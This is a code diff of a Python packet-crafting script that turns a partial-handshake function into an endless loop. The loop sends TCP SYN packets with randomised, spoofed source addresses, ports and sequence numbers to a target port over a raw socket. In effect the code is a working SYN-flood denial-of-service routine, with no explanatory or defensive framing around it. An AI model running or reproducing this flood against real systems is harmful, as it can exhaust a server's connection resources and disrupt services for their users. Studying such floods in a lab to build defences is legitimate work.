@@ -23,17 +23,20 @@ dport=12000
 #sport=RandNum(1024,65535)
 
 def partial_handshake():
+    conf.L3socket = L3RawSocket
     while True:
         srcip = '127.' + str(random.randint(1,255)) + '.' + str(random.randint(1,255)) + '.' + str(random.randint(3,255))
         sport = random.randint(1024,65535)
-        syn_pkg = IP(src=srcip, dst=addr)/TCP(sport=sport, dport=dport, flags='S', seq=1000)
-        
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((srcip,sport))
-        s.connect((addr,dport))
+        seq = random.randint(1000,99999999)
+        syn_pkg = IP(src=srcip, dst=addr)/TCP(sport=sport, dport=dport, flags='S', seq=seq)
+        send(syn_pkg)
+        #syn_pkg.seq += 1
+        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#        s.bind((srcip,sport))
+        #s.connect((addr,dport))
         #s = socket.socket()
         #s.connect(('127.0.0.2',dport))
-        s.send(bytes(syn_pkg))
+        #s.send(bytes(syn_pkg))
     #syn_ack = sr1(syn_pkg)
     #seq = syn_ack[0][0][-1][TCP].seq
     #ack = syn_ack[0][0][-1][TCP].ack
